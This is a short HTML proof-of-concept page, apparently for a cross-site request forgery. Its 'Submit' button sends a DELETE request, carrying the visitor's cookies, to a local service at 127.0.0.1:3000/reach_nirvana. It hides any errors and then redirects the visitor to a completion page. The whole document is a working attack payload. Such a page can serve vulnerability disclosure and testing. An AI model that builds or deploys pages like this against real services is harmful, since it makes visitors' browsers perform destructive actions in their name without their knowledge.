<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>poc</title>
</head>
<body>
  <button id="go">Submit</button>
  <script>
    async function go() {
      try {
        await fetch('http://127.0.0.1:3000/reach_nirvana', {
          method: 'DELETE',
          credentials: 'include'
        });
      } catch (e) {}
      // Optional: signal completion to your infra/logs
      setTimeout(() => location.href = 'https://example.com/done', 500);
    }
    document.getElementById('go').addEventListener('click', go);
  </script>
</body>
</html>
